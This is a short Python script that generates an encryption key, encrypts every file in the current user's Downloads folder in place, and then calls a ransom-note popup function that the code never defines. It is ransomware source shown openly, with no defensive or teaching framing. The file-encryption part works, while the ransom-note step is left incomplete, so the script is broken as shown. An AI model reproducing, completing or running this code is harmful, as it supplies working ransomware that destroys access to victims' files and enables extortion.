import os
from pathlib import Path
from cryptography.fernet import Fernet
import tkinter as tk
from tkinter import messagebox

# Function to generate and save a secure encryption key
def generate_and_save_key(key_path='encryption_key.key'):
    key = Fernet.generate_key()
    with open(key_path, 'wb') as key_file:
        key_file.write(key)
    return key

# Function to load an existing encryption key
def load_key(key_path='encryption_key.key'):
    with open(key_path, 'rb') as key_file:
        return key_file.read()

# Encrypt a file with a given key
def encrypt_file(file_path, key):
    fernet = Fernet(key)
    with open(file_path, 'rb') as file:
        original_data = file.read()
    encrypted_data = fernet.encrypt(original_data)
    with open(file_path, 'wb') as file:
        file.write(encrypted_data)
    print(f"Encrypted {file_path}")

# Function to encrypt all files in the Downloads folder
def encrypt_downloads_folder(key):
    downloads_folder = Path.home() / 'Downloads'  # Gets the Downloads folder of the current user

    if downloads_folder.exists():
        for file_path in downloads_folder.iterdir():
            if file_path.is_file():  # Ensure it's a file
                encrypt_file(file_path, key)
    else:
        print(f"Downloads folder does not exist: {downloads_folder}")

# Example usage
# Generate or load encryption key
key_path = 'encryption_key.key'
key = generate_and_save_key(key_path) if not Path(key_path).exists() else load_key(key_path)

# Encrypt files in the Downloads folder
encrypt_downloads_folder(key)

# Show the ransom note popup
show_ransom_note_popup()
